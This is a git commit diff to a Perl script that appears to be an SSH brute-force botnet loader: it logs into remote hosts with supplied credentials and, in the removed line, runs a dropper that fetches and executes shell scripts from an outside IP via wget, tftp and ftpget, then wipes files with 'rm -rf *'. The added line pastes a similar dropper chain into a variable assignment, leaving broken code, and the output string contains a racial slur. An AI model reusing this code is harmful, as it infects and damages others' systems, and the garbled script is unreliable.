3485a4e8a7a2428cf94d659dfdd80c2bfdbb3176
minedevelopes <rivan726@gmail.com>
2018-02-24 10:17:15 +0530

    Update cli.pl

--- cli.pl
+++ cli.pl
@@ -10,13 +10,13 @@ my $pm = new Parallel::ForkManager(550); for (my $i=0; $i <
 scalar(@newarray); $i+=3) {
         $pm->start and next;
         $a = $i;
-        $b = $i+1;
+        $b = $i+1;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.105.49.213/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; tftp 103.105.49.213 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 103.105.49.213; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.105.49.213 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *
         $c = $i+2;
         $ssh = Net::SSH2->new();
         if ($ssh->connect($newarray[$c])) {
                 if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                         $channel = $ssh->channel();
-                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://1.1.1.1/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 1.1.1.1 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 1.1.1.1; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 1.1.1.1 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *');
+                        $channel->exec('');
                         sleep 10;
                         $channel->close;
                         print "\e[37;1mNigga They Joining: ".$newarray[$c]."\n";
